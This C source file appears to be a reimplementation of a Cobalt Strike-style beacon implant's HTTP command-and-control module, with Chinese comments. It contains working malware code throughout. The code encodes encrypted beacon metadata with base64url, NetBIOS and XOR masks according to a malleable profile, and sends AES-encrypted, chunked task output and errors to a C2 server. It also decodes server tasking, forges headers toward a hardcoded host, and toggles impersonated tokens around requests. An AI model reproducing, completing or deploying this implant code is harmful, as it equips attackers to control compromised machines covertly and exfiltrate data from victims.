/*
beacon http通信
*/
#include "comm.h"
#include "common.h"
#include "tomcrypt.h"
#include "encrypt_decrypt.h"

void BeaconHttpRequestInit(int buffer_size, BeaconHttpRequest* beaconhttprequest)
{
	beaconhttprequest->encrypt_Metadata_size = 3 * buffer_size;
	if (3 * buffer_size < 8192)
	{
		beaconhttprequest->encrypt_Metadata_size = 8192;
	}
	datap* pdatap = BeaconDataInit(3 * (beaconhttprequest->encrypt_Metadata_size + 1024));
	beaconhttprequest->pdatap = pdatap;
	beaconhttprequest->HttpOptionalLength = 0;
	
	char* HttpHeaders = BeaconDataPtr(pdatap, 1024);
	beaconhttprequest->httpHeaders = HttpHeaders;

	char* field_1 = BeaconDataPtr(pdatap, 1024);
	beaconhttprequest->field_1 = field_1;

	char* httpGetUrl = BeaconDataPtr(pdatap, 1024);
	beaconhttprequest->httpGetUrl = httpGetUrl;

	char* HttpOptional = BeaconDataPtr(pdatap, beaconhttprequest->encrypt_Metadata_size);
	beaconhttprequest->HttpOptional = HttpOptional;


	char* encrypt_Metadata_Ptr = BeaconDataPtr(pdatap, beaconhttprequest->encrypt_Metadata_size);
	beaconhttprequest->encrypt_Metadata_Ptr = encrypt_Metadata_Ptr;

	char* Encoding_Encrypt_Metadata_Ptr = BeaconDataPtr(pdatap, beaconhttprequest->encrypt_Metadata_size);
	beaconhttprequest->Encoding_Encrypt_Metadata_Ptr = Encoding_Encrypt_Metadata_Ptr;
}

void BeaconHttpRequestFree(BeaconHttpRequest* beaconhttprequest)
{
	BeaconDataFree(beaconhttprequest->pdatap);
}


static const char* const codes_base64url = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

static int _base64_encode_internal(const unsigned char* in, unsigned long inlen,
	unsigned char* out, unsigned long* outlen,
	const char* codes, int pad)
{
	unsigned long i, len2, leven;
	unsigned char* p;

	/* valid output size ? */
	len2 = 4 * ((inlen + 2) / 3);
	if (*outlen < len2 + 1) {
		*outlen = len2 + 1;
		return CRYPT_BUFFER_OVERFLOW;
	}
	p = out;
	leven = 3 * (inlen / 3);
	for (i = 0; i < leven; i += 3) {
		*p++ = codes[(in[0] >> 2) & 0x3F];
		*p++ = codes[(((in[0] & 3) << 4) + (in[1] >> 4)) & 0x3F];
		*p++ = codes[(((in[1] & 0xf) << 2) + (in[2] >> 6)) & 0x3F];
		*p++ = codes[in[2] & 0x3F];
		in += 3;
	}
	/* Pad it if necessary...  */
	if (i < inlen) {
		unsigned a = in[0];
		unsigned b = (i + 1 < inlen) ? in[1] : 0;

		*p++ = codes[(a >> 2) & 0x3F];
		*p++ = codes[(((a & 3) << 4) + (b >> 4)) & 0x3F];
		if (pad) {
			*p++ = (i + 1 < inlen) ? codes[(((b & 0xf) << 2)) & 0x3F] : '=';
			*p++ = '=';
		}
		else {
			if (i + 1 < inlen) *p++ = codes[(((b & 0xf) << 2)) & 0x3F];
		}
	}

	/* append a NULL byte */
	*p = '\0';

	/* return ok */
	*outlen = (unsigned long)(p - out);
	return CRYPT_OK;
}

int base64url_encode(char* in, unsigned long inlen,
	unsigned char* out, unsigned long* outlen)
{
	return _base64_encode_internal((const unsigned char*)in, inlen, out, outlen, codes_base64url, 0);
}
int NetBIOS_Encode(char* out, char key, char* in, int a4, int in_size)
{
	int v5;
	unsigned __int8 v7;
	int i;
	v5 = 0;
	for (i = 0; v5 < a4; i += 2)
	{
		if (i >= in_size)
		{
			break;
		}
		v7 = in[v5];
		out[i] = key + (v7 >> 4);
		out[i + 1] = key + (v7 & 0xF);
		++v5;
	}
	return i;//返回长度
}


/// <summary>
/// xor编码数据
/// </summary>
/// <param name="a1"></param>
/// <param name="a3"></param>
/// <param name="a4"></param>
/// <param name="a5"></param>
/// <returns></returns>
unsigned int xor_encode(char* a1, unsigned int a3, char* a4, unsigned int a5)
{
	unsigned int v4;
	char* v5;
	char* v7;
	unsigned int v8;
	char* v9;
	char v10;

	v4 = a3 + 4;
	v5 = a1;
	if (a3 + 4 > a5)
	{
		return 0;
	}
	*(DWORD*)a1 = random_int();
	v7 = v5 + 4;
	v8 = 0;
	if (!a3)
	{
		return v4;
	}
	do
	{
		v9 = &v7[v8];
		v10 = a4[v8] ^ a1[v8 & 3];
		++v8;
		*v9 = v10;
	} while (v8 < a3);
	return a3 + 4;
}

unsigned int xor_decode(int insize, char* in, char* out, unsigned int size)
{
	unsigned int v7;
	unsigned int v8;
	int v9;
	char* v10;
	char v11;

	if (insize - 4 > size)
	{
		return 0;
	}
	v7 = insize - 4;
	v8 = 0;
	if (!v7)
	{
		return v7;
	}
	v9 = in + 4 - out;
	do
	{
		v10 = &out[v8];
		v11 = out[v8 + v9] ^ in[v8 & 3];
		++v8;
		*v10 = v11;
	} while (v8 < v7);
	return v7;
}

int NetBIOS_decode(char* a1, char a2, int size, char* a4, int a5)
{
	int v7;
	char v8;

	if (size % 2 == 1)
	{
		return 0;
	}
	for (int i = 0; i < size; a4[v7] = v8)
	{
		v7 = i / 2;
		if (i / 2 >= a5)
		{
			break;
		}
		v8 = a1[i + 1] + 16 * a1[i] - 17 * a2;
		i += 2;
	}
	return size / 2;
}


int base64url_decode(unsigned int inlen, char* in, unsigned int a3, char* out, DWORD* outlen)
{
	unsigned int i;
	char v6;

	for (i = 0; i < inlen; ++i)
	{
		v6 = in[i];
		if (v6 == 95)
		{
			in[i] = 47;
		}
		else if (v6 == 45)
		{
			in[i] = 43;
		}
	}
	while (1)
	{
		if ((inlen & 3) == 0)
			return base64_decode((const unsigned char*)in, inlen, (unsigned char*)out, outlen);
		if (inlen > a3)
			break;
		in[inlen++] = 61;
	}
	return 6;
}

/// <summary>
/// 对http请求返回的数据进行解码
/// </summary>
/// <param name="Output_Buffer">请求返回buffer</param>
/// <param name="Buffer_size">buffer大小</param>
/// <param name="server_output_config">输出配置</param>
/// <param name="server_output_size"></param>
/// <returns></returns>
int decode_metadata(char* Output_Buffer, size_t Buffer_size, char* server_output_config, int server_output_size)
{
	int data_size = Buffer_size;
	char* Decode_Buffer = (char*)malloc(Buffer_size);
	memset(Decode_Buffer, 0, Buffer_size);
	if (!Decode_Buffer)
	{
		return 0;
	}
	datap pdata;
	BeaconDataParse(&pdata, server_output_config, 1024);
	int append_size = 0;
	int prepend_size = 0;
	
	while (true)
	{
		int index = BeaconDataInt(&pdata);
		switch (index)
		{
		case 0:
		{
			free(Decode_Buffer);
			return data_size;
		}
		case 1://append  末尾附加
		{
			
			data_size -= BeaconDataInt(&pdata);
			continue;
		}

		case 2://prepend 将指定字符串附加在头部
		{
			prepend_size = BeaconDataInt(&pdata);
			if (prepend_size > data_size)
			{
				data_size = 0;
				free(Decode_Buffer);
				return data_size;
			}
			memcpy(Decode_Buffer, Output_Buffer, data_size);
			data_size -= prepend_size;
			memcpy(Output_Buffer, &Decode_Buffer[prepend_size], data_size);
			continue;
		}

		case 3://BASE64
		{
			Output_Buffer[data_size] = 0;
			unsigned long out_size = server_output_size;
			// base解密
			if (base64_decode((const unsigned char*)Output_Buffer, data_size, (unsigned char*)Decode_Buffer, &out_size))
			{
				data_size = 0;
				free(Decode_Buffer);
				return data_size;
			}
			data_size = out_size;
			memcpy(Output_Buffer, Decode_Buffer, out_size);
			continue;
		}

		case 4://print 什么都不做

			continue;
		case 5:
			continue;
		case 6:
			continue;
		case 7:
			continue;
		case 8://netbios
		{
			Output_Buffer[data_size] = 0;
			int out_size = NetBIOS_decode(Output_Buffer, 'a', data_size, Decode_Buffer, server_output_size);
			data_size = out_size;
			if (!out_size)
			{
				break;
			}
			memcpy(Output_Buffer, Decode_Buffer, out_size);
			Output_Buffer[data_size] = 0;
			continue;
		}

		case 9:
			continue;
		case 10:
			continue;
		case 11://netbiosu
		{
			Output_Buffer[data_size] = 0;
			int out_size = NetBIOS_decode(Output_Buffer, 'A', data_size, Decode_Buffer, server_output_size);
			data_size = out_size;
			if (!out_size)
			{
				break;
			}
			memcpy(Output_Buffer, Decode_Buffer, out_size);
			Output_Buffer[data_size] = 0;
			continue;
		}

		case 12:
			continue;
		case 13://base64url
		{
			unsigned long out_size = server_output_size;
			Output_Buffer[data_size] = 0;
			if (base64url_decode(data_size, (char*)Output_Buffer, server_output_size, Decode_Buffer, &out_size)) 
			{
				data_size = 0;
				free(Decode_Buffer);
				return data_size;
			}
			data_size = out_size;
			memcpy(Output_Buffer, Decode_Buffer, out_size);
			continue;
		}

		case 14:
			continue;
		case 15://mask xor
		{
			Output_Buffer[data_size] = 0;
			int out_size = xor_decode(data_size, Output_Buffer, Decode_Buffer, server_output_size);// xor
			data_size = out_size;
			if (!out_size)
			{
				break;
			}
			memcpy(Output_Buffer, Decode_Buffer, out_size);
			Output_Buffer[data_size] = 0;
			continue;
		}

		case 16:
			continue;
		default:
			break;
		}
	}
}


/// <summary>
/// 对需要发送的元数据根据http请求配置进行格式化
/// </summary>
/// <param name="http_get_client_config"></param>
/// <param name="beaconhttprequest"></param>
/// <param name="Encryption_Metadata"></param>
/// <param name="Encryption_Metadata_size"></param>
/// <param name="a5"></param>
/// <param name="a6"></param>
void encode_Metadata(char* http_get_client_config, BeaconHttpRequest* beaconhttprequest, char* Encryption_Metadata, int Encryption_Metadata_size, void* a5, size_t a6)
{
	char Buffer[1024] = { 0 };
	char* httpHeaderHost = decryptString(shark_httpHeaderHost);  //54
	int Size = 0;

	datap pdatap;
	BeaconDataParse(&pdatap, http_get_client_config, 1024);
	int v30 = 0;
	while (2)
	{
		int index = BeaconDataInt(&pdatap);
		switch (index)
		{
		case 0:
			if ( v30 ||!httpHeaderHost)
			{
				return;
			}

			if (!strlen(httpHeaderHost))
			{
				return;
			}

			_snprintf(
				beaconhttprequest->Encoding_Encrypt_Metadata_Ptr,
				1024,
				"%s%s\r\n",
				beaconhttprequest->httpHeaders,
				httpHeaderHost);
			memcpy(beaconhttprequest->httpHeaders, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, 1024);
			return;

		case 1:
		{
			memset(Buffer, 0, sizeof(Buffer));
			int copy_size = BeaconDataCopyToBuffer(&pdatap, Buffer, 1024);
			memcpy((char*)beaconhttprequest->encrypt_Metadata_Ptr + Size, Buffer, copy_size);
			Size += &Buffer[strlen(Buffer) + 1] - &Buffer[1];
			continue;
		}


		case 2:
		{
			memset(Buffer, 0, sizeof(Buffer));
			int copy_size = BeaconDataCopyToBuffer(&pdatap, Buffer, 1024);
			memcpy(beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, Buffer, copy_size);
			memcpy(beaconhttprequest->Encoding_Encrypt_Metadata_Ptr + strlen(Buffer), beaconhttprequest->encrypt_Metadata_Ptr, Size);
			Size += strlen(Buffer);
			memset(beaconhttprequest->encrypt_Metadata_Ptr, 0, beaconhttprequest->encrypt_Metadata_size);
			memcpy(beaconhttprequest->encrypt_Metadata_Ptr, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, Size);
			continue;
		}


		case 3:
		{
			unsigned long encrypt_Metadata_size = beaconhttprequest->encrypt_Metadata_size;
			if (!base64_encode(
				(unsigned char*)beaconhttprequest->encrypt_Metadata_Ptr,
				Size,
				(unsigned char*)beaconhttprequest->Encoding_Encrypt_Metadata_Ptr,
				&encrypt_Metadata_size))
			{
				Size = encrypt_Metadata_size;
				memset(beaconhttprequest->encrypt_Metadata_Ptr, 0, beaconhttprequest->encrypt_Metadata_size);
				memcpy(beaconhttprequest->encrypt_Metadata_Ptr, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, encrypt_Metadata_size);
				continue;
			}
			return;
		}

		case 4:
		{
			memcpy(beaconhttprequest->HttpOptional, beaconhttprequest->encrypt_Metadata_Ptr, Size);
			beaconhttprequest->HttpOptionalLength = Size;
			continue;
		}

		case 5:
		{
			memset(Buffer, 0, sizeof(Buffer));
			BeaconDataCopyToBuffer(&pdatap, Buffer, 1024);
			if (*beaconhttprequest->field_1)
			{
				_snprintf(beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, 1024, "%s&%s=%s", beaconhttprequest->field_1, Buffer, beaconhttprequest->encrypt_Metadata_Ptr);
			}
			else
			{
				_snprintf(beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, 1024, "?%s=%s", Buffer, beaconhttprequest->encrypt_Metadata_Ptr);
			}
			memcpy(beaconhttprequest->field_1, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, 1024);
			continue;
		}

		case 6:
		{
			memset(Buffer, 0, sizeof(Buffer));
			BeaconDataCopyToBuffer(&pdatap, Buffer, 1024);
			_snprintf(
				beaconhttprequest->Encoding_Encrypt_Metadata_Ptr,
				1024,
				"%s%s: %s\r\n",
				beaconhttprequest->httpHeaders,
				Buffer,
				beaconhttprequest->encrypt_Metadata_Ptr);
			memcpy(beaconhttprequest->httpHeaders, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, 1024);
			continue;
		}


		case 7:
		{
			int size = BeaconDataInt(&pdatap);
			if (size)
			{
				if (size != 1)
				{
					continue;
				}
				Size = a6;
				memcpy(beaconhttprequest->encrypt_Metadata_Ptr, a5, a6);
			}
			else
			{
				Size = Encryption_Metadata_size;
				memcpy(beaconhttprequest->encrypt_Metadata_Ptr, Encryption_Metadata, Encryption_Metadata_size);
			}
			continue;
		}


		case 8:
		{
			int size = NetBIOS_Encode(
				beaconhttprequest->Encoding_Encrypt_Metadata_Ptr,
				'a',
				beaconhttprequest->encrypt_Metadata_Ptr,
				Size,
				beaconhttprequest->encrypt_Metadata_size);
			Size = size;
			memset(beaconhttprequest->encrypt_Metadata_Ptr, 0, beaconhttprequest->encrypt_Metadata_size);
			memcpy(beaconhttprequest->encrypt_Metadata_Ptr, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, Size);
			continue;
		}


		case 9:
		{
			memset(Buffer, 0, sizeof(Buffer));
			BeaconDataCopyToBuffer(&pdatap, Buffer, 1024);
			if (*beaconhttprequest->field_1)
			{
				_snprintf(beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, 1024, "%s&%s", beaconhttprequest->field_1, Buffer);
			}
			else
			{
				_snprintf(beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, 1024, "?%s", Buffer);
			}
			memcpy(beaconhttprequest->field_1, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, 1024);
			continue;
		}


		case 10:
		{
			memset(Buffer, 0, sizeof(Buffer));
			BeaconDataCopyToBuffer(&pdatap, Buffer, 1024);
			_snprintf(
				beaconhttprequest->Encoding_Encrypt_Metadata_Ptr,
				1024,
				"%s%s\r\n",
				beaconhttprequest->httpHeaders,
				Buffer);
			memcpy(beaconhttprequest->httpHeaders, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, 0x400u);
			continue;
		}


		case 11:
		{
			int size = NetBIOS_Encode(
				beaconhttprequest->Encoding_Encrypt_Metadata_Ptr,
				'A',
				(char*)beaconhttprequest->encrypt_Metadata_Ptr,
				Size,
				beaconhttprequest->encrypt_Metadata_size);
			Size = size;
			memset(beaconhttprequest->encrypt_Metadata_Ptr, 0, beaconhttprequest->encrypt_Metadata_size);
			memcpy(beaconhttprequest->encrypt_Metadata_Ptr, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, Size);
			continue;
		}


		case 12:
		{
			_snprintf(
				beaconhttprequest->Encoding_Encrypt_Metadata_Ptr,
				1024,
				"%s%s",
				beaconhttprequest->httpGetUrl,
				beaconhttprequest->encrypt_Metadata_Ptr);
			memcpy(beaconhttprequest->httpGetUrl, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, 1024);
			continue;
		}


		case 13:
		{
			unsigned long outsize = beaconhttprequest->encrypt_Metadata_size;
			if (base64url_encode(beaconhttprequest->encrypt_Metadata_Ptr, Size, (unsigned char*)beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, &outsize))
			{
				return;
			}
			Size = outsize;
			memset(beaconhttprequest->encrypt_Metadata_Ptr, 0, beaconhttprequest->encrypt_Metadata_size);
			memcpy(beaconhttprequest->encrypt_Metadata_Ptr, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, outsize);
			continue;
			return;
		}

		case 15:
		{
			int outsize = xor_encode(
				beaconhttprequest->Encoding_Encrypt_Metadata_Ptr,
				Size,
				beaconhttprequest->encrypt_Metadata_Ptr,
				beaconhttprequest->encrypt_Metadata_size); // xor
			Size = outsize;
			memset(beaconhttprequest->encrypt_Metadata_Ptr, 0, beaconhttprequest->encrypt_Metadata_size);
			memcpy(beaconhttprequest->encrypt_Metadata_Ptr, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, Size);
			continue;
		}

		case 16:
		{
			memset(Buffer, 0, sizeof(Buffer));
			BeaconDataCopyToBuffer(&pdatap, Buffer, 1024);
			if (httpHeaderHost && strlen(httpHeaderHost))
			{
				_snprintf(
					beaconhttprequest->Encoding_Encrypt_Metadata_Ptr,
					1024,
					"%s%s\r\n",
					beaconhttprequest->httpHeaders,
					httpHeaderHost);
				v30 = 1;
			}
			else
			{
				_snprintf(
					beaconhttprequest->Encoding_Encrypt_Metadata_Ptr,
					0x400u,
					"%s%s\r\n",
					beaconhttprequest->httpHeaders,
					Buffer);
			}
			memcpy(beaconhttprequest->httpHeaders, beaconhttprequest->Encoding_Encrypt_Metadata_Ptr, 1024);
			continue;
		}

		default:
			break;
		}
	}

}

int send_Metadata(char* http_get_url, char* Server_Output_Buffer, int server_output_size)
{
	CHAR szObjectName[1024] = { 0 };
	BeaconHttpRequest beaconhttprequest = { 0 };

	PCTSTR lpszAcceptTypes[] = { TEXT("*/*"), NULL };

	BeaconHttpRequestInit(g_Encryption_Metadata_size, &beaconhttprequest);

	_snprintf((char*)beaconhttprequest.httpGetUrl, 1024, "%s", http_get_url);

	char* http_get_client_config = decryptString(shark_http_get_client_config);//获取请求配置 12
	//对即将发送的数据按照配置进行编码组合
	encode_Metadata(http_get_client_config, &beaconhttprequest, g_Encryption_Metadata, g_Encryption_Metadata_size, 0, 0);
	
	if (&beaconhttprequest.field_1[strlen(beaconhttprequest.field_1) + 1] == beaconhttprequest.field_1 + 1)
	{
		_snprintf(szObjectName, 1024, "%s", beaconhttprequest.httpGetUrl);
	}
	else
	{
		_snprintf(szObjectName, 1024, "%s%s", beaconhttprequest.httpGetUrl, beaconhttprequest.field_1);
	}


	char* verb = decryptString(shark_verb);	//get or post
	HINTERNET hRequest = HttpOpenRequestA(g_hConnect, verb, szObjectName, 0, 0, lpszAcceptTypes, g_dwFlags, g_dwContext);
	set_http_opt(hRequest);

    TCHAR headerReferer[] = "Referer: http://192.168.8.72:8080/oss/client/create.g\r\n";
    TCHAR headerLanguage[] = "Accept-Language: zh-CN,zh;q=0.8\r\n";
    TCHAR headerEncoding[] = "Accept-Encoding: gzip,deflate,sdch\r\n";
    TCHAR headerCharset[] = "Accept-Charset:GBK,utf-8;q=0.7,*;q=0.3\r\n";
    TCHAR headerContentType[] = "Content-Type: text/xml\r\n";
    TCHAR* headerCookie = beaconhttprequest.httpHeaders;
    TCHAR headerHost[] = "Host: 192.168.8.72:8080\r\n";
    TCHAR headerOrigin[] = "Origin: http://192.168.8.72:8080\r\n";

    /*TCHAR* headerContentLength = beaconhttprequest.httpHeaders;*/
/*    TCHAR headerContentLength[1024];
    _snprintf(headerContentLength, 1024, "%s", beaconhttprequest.httpHeaders);*/
    BOOL bRet;

    bRet = HttpAddRequestHeaders(hRequest, headerLanguage,    -1, HTTP_ADDREQ_FLAG_ADD|HTTP_ADDREQ_FLAG_REPLACE);
    bRet = HttpAddRequestHeaders(hRequest, headerEncoding,    -1, HTTP_ADDREQ_FLAG_ADD|HTTP_ADDREQ_FLAG_REPLACE);
    bRet = HttpAddRequestHeaders(hRequest, headerCharset,    -1, HTTP_ADDREQ_FLAG_ADD|HTTP_ADDREQ_FLAG_REPLACE);
    bRet = HttpAddRequestHeaders(hRequest, headerCookie, -1, HTTP_ADDREQ_FLAG_ADD|HTTP_ADDREQ_FLAG_REPLACE);
    bRet = HttpAddRequestHeaders(hRequest, headerContentType, -1, HTTP_ADDREQ_FLAG_ADD|HTTP_ADDREQ_FLAG_REPLACE);
    bRet = HttpAddRequestHeaders(hRequest, headerHost, -1, HTTP_ADDREQ_FLAG_ADD|HTTP_ADDREQ_FLAG_REPLACE);
    bRet = HttpAddRequestHeaders(hRequest, headerOrigin, -1, HTTP_ADDREQ_FLAG_ADD|HTTP_ADDREQ_FLAG_REPLACE);
    bRet = HttpAddRequestHeaders(hRequest, headerReferer, -1, HTTP_ADDREQ_FLAG_ADD|HTTP_ADDREQ_FLAG_REPLACE);


    //发送请求
	HttpSendRequestA(
		hRequest,
		NULL,
		0,
		beaconhttprequest.HttpOptional,
		beaconhttprequest.HttpOptionalLength);
 /*   HttpSendRequestA(
            hRequest,
            beaconhttprequest.httpHeaders,
            strlen(beaconhttprequest.httpHeaders),
            beaconhttprequest.HttpOptional,
            beaconhttprequest.HttpOptionalLength);*/

	//释放内存
	BeaconHttpRequestFree(&beaconhttprequest);
	if (!verify_http_200(hRequest))
	{
		InternetCloseHandle(hRequest);
		return -1;
	}
	DWORD dwNumberOfBytesAvailable=0;
	DWORD dwNumberOfBytesRead = 0;
	DWORD size = 0;
	// 调用InternetQueryDataAvailable()查询返回的数据大小
	if (InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0)
		&& dwNumberOfBytesAvailable
		&& dwNumberOfBytesAvailable < server_output_size)
	{
		if (!server_output_size)
		{
			InternetCloseHandle(hRequest);
			return 0;
		}
		do
		{
			if (!InternetReadFile(hRequest, Server_Output_Buffer + size, 0x1000, &dwNumberOfBytesRead))
			{
				break;
			}
			if (!dwNumberOfBytesRead)
			{
				break;
			}
			size += dwNumberOfBytesRead;

		} while (size < server_output_size);
		if (size >= server_output_size)
		{
			InternetCloseHandle(hRequest);
			return 0;
		}
		InternetCloseHandle(hRequest);
		char* server_output_config = decryptString(shark_server_output_config);       // .http-get.server.output
		//根据配置解码服务端输出
		int decode_size = decode_metadata((char*)Server_Output_Buffer, size, server_output_config, server_output_size);
		return decode_size;
	}
	else
	{
		InternetCloseHandle(hRequest);
		return 0;
	}
	return 0;
}

/// <summary>
/// 调用send_Metadata发送元数据，返回接收数据大小
/// </summary>
/// <param name="http_get_url">http请求url</param>
/// <param name="Metadata"></param>
/// <param name="output_size"></param>
/// <returns></returns>
int call_send_Metadata(char* http_get_url, char* Server_Output_Buffer, int server_output_size)
{
	close_token_fake();
	int size = send_Metadata(http_get_url, Server_Output_Buffer, server_output_size);
	restore_token_fake();
	return size;
}

/// <summary>
/// 发送beacon 任务执行结果
/// </summary>
/// <param name="data"></param>
/// <returns></returns>
void sned_beacon_data(char *data)
{
	CHAR szObjectName[1024] = { 0 };
	BeaconHttpRequest  beaconhttprequest = { 0 };

	PCTSTR lpszAcceptTypes[] = { TEXT("*/*"), NULL };
	char DataBuffer[128] = { 0 };
	if (g_withdatasize)
	{
		BeaconHttpRequestInit(g_withdatasize, &beaconhttprequest);
		_snprintf(beaconhttprequest.httpGetUrl, 1024, "%s", g_post_url);
		_snprintf(DataBuffer, 0x80u, "%d", beacon_id);
		int DataBuffer_size = strlen(DataBuffer);
		char* http_post_client_config = decryptString(shark_http_post_client_config);        // .http-post.client
		encode_Metadata(http_post_client_config, &beaconhttprequest, DataBuffer, DataBuffer_size, data, g_withdatasize);

		if (&beaconhttprequest.field_1[strlen(beaconhttprequest.field_1) + 1] == beaconhttprequest.field_1 + 1)
		{
			_snprintf(szObjectName, 0x400u, "%s", beaconhttprequest.httpGetUrl);
		}
		else
		{
			_snprintf(szObjectName, 0x400u, "%s%s", beaconhttprequest.httpGetUrl, beaconhttprequest.field_1);
		}

		close_token_fake();

		int beacon_request_error = 0;
		HINTERNET hRequest;
		while (true)
		{
			char* str = decryptString(shark_http_verb);
			hRequest = HttpOpenRequestA(g_hConnect, str, szObjectName, 0, 0, lpszAcceptTypes, g_dwFlags, g_dwContext);
			set_http_opt(hRequest);

			HttpSendRequestA(
				hRequest,
				beaconhttprequest.httpHeaders,
				strlen(beaconhttprequest.httpHeaders),
				beaconhttprequest.HttpOptional,
				beaconhttprequest.HttpOptionalLength);

			if (verify_http_200(hRequest))
			{
				break;
			}
			InternetCloseHandle(hRequest);
			Sleep(500);
			if (++beacon_request_error >= 4)
			{
				BeaconHttpRequestFree(&beaconhttprequest);
				g_withdatasize = 0;
				restore_token_fake();
				return;
			}
		}

		InternetCloseHandle(hRequest);
		BeaconHttpRequestFree(&beaconhttprequest);
		g_withdatasize = 0;
		restore_token_fake();

	}
}
char* gBeaconOutputData;
void sub_10002340(int encrypt_data_len, char* encrypt_data, int delay)
{
	if (!gBeaconOutputData)
	{
		gBeaconOutputData = (char*)malloc(0x200000);
	}
	
	if (encrypt_data_len + 4 <= 0x200000)
	{
		if (g_withdatasize + encrypt_data_len + 4 > 0x200000)
		{
			sned_beacon_data(gBeaconOutputData);
		}
		*(int*)&gBeaconOutputData[g_withdatasize] = htonl(encrypt_data_len);
		memcpy(&gBeaconOutputData[g_withdatasize + 4], encrypt_data, encrypt_data_len);// 组装发送数据第一个int为加密数据的大小后附加加密数据
		g_withdatasize = encrypt_data_len + g_withdatasize + 4;              // 新大小等于加密数据+4字节的int（此int是加密数据的长度）
		if (delay)
		{
			sned_beacon_data(gBeaconOutputData);
		}
	}
}

void sub_10001287(void* data, size_t data_size, int type, int delay)
{
	int out_encrypt_data_len = 0;
	// 对data aes加密和Hmac摘要
	char* encrypt_data = aes_encrypt_data(data, data_size, type, &out_encrypt_data_len);
	if (out_encrypt_data_len)
	{
		if (g_BeaconStart == 1)
		{
			sub_10002340(out_encrypt_data_len, encrypt_data, delay);
		}
		free(encrypt_data);
	}
}


void sub_10001D10(int data_Size, char* data, int type)
{
	int shouldChunkPosts = decryptInt(shark_shouldChunkPosts);
	formatp pformatp;
	BeaconFormatAlloc(&pformatp, 2 * shouldChunkPosts);
	BeaconFormatInt(&pformatp, data_Size + 4);
	BeaconFormatInt(&pformatp, type);
	BeaconFormatAppend(&pformatp, data, shouldChunkPosts - 8);
	char* pdata1 = &data[shouldChunkPosts - 8];
	int pdata2 = shouldChunkPosts - 8;
	int buffer_length = BeaconFormatlength(&pformatp);
	char* buffer = BeaconFormatOriginalPtr(&pformatp);
	sub_10001287(buffer, buffer_length, 0x1C, 1);
	BeaconFormatFree(&pformatp);

	int v1 = 0;
	if (shouldChunkPosts - 8 < data_Size)
	{
		do
		{
			v1 = data_Size - pdata2;
			if (data_Size - pdata2 > shouldChunkPosts)
			{
				v1 = shouldChunkPosts;
			}
			sub_10001287(pdata1, v1, 0x1D, 1);
			pdata2 += v1;
			pdata1 += v1;
		} while (pdata2 < data_Size);
	}
}


void sub_10001DCD(size_t data_Size, char* data, int type)
{
	if (data_Size <= decryptInt(shark_shouldChunkPosts))
	{
		sub_10001287(data, data_Size, type, 1);
	}
	else
	{
		sub_10001D10(data_Size, data, type);
	}
}



/// <summary>
/// 发送Beacon任务执行输出到server
/// </summary>
/// <param name="data"></param>
/// <param name="len"></param>
/// <param name="type"></param>
void BeaconTaskOutput(char* data, int len, int type)
{
	if (g_BeaconStart == 1 && decryptInt(shark_shouldChunkPosts))//28分块标识
	{
		sub_10001DCD(len, data, type);
	}
	else
	{
		sub_10001287(data, len, type, 0);
	}
}

/// <summary>
/// 用于专门报告错误
/// </summary>
/// <param name="BeaconErrorsType"></param>
/// <param name="err_code_1"></param>
/// <param name="err_code_2"></param>
/// <param name="buffer"></param>
void BeaconTaskErrorOutput(u_long BeaconErrorsType, int err_code_1, u_long err_code_2, char* buffer)
{
	formatp pformatp;
	BeaconFormatAlloc(&pformatp, 2048);
	BeaconFormatInt(&pformatp, BeaconErrorsType);
	BeaconFormatInt(&pformatp, err_code_1);
	BeaconFormatInt(&pformatp, err_code_2);
	if (buffer)
	{
		BeaconFormatAppend(&pformatp, buffer, strlen(buffer));
	}
	int size = BeaconFormatlength(&pformatp);
	char* data = BeaconFormatOriginalPtr(&pformatp);
	BeaconTaskOutput(data, size, CALLBACK_ERROR);
	BeaconFormatFree(&pformatp);
}

void BeaconTaskError1Output(int BeaconErrorsType, int err_code, char* data)
{
	BeaconTaskErrorOutput(BeaconErrorsType, err_code, 0, data);
}
void BeaconErrorD(int BeaconErrorsType, DWORD error_code)
{
	BeaconTaskErrorOutput(BeaconErrorsType, error_code, 0, 0);
}

void BeaconErrorNA(int BeaconErrorsType)
{
	BeaconTaskErrorOutput(BeaconErrorsType, 0, 0, 0);
}

void BeaconErrorDD(int BeaconErrorsType, int err_msg, u_long err_code_msg)
{
	BeaconTaskErrorOutput(BeaconErrorsType, err_msg, err_code_msg, 0);
}

void BeaconErrorFormat(int BeaconErrorsType, char* Format, ...)
{
	char Buffer[2048];
	va_list ArgList;

	va_start(ArgList, Format);
	vsprintf_s(Buffer, 0x800, Format, ArgList);
	BeaconTaskErrorOutput(BeaconErrorsType, 0, 0, Buffer);
}
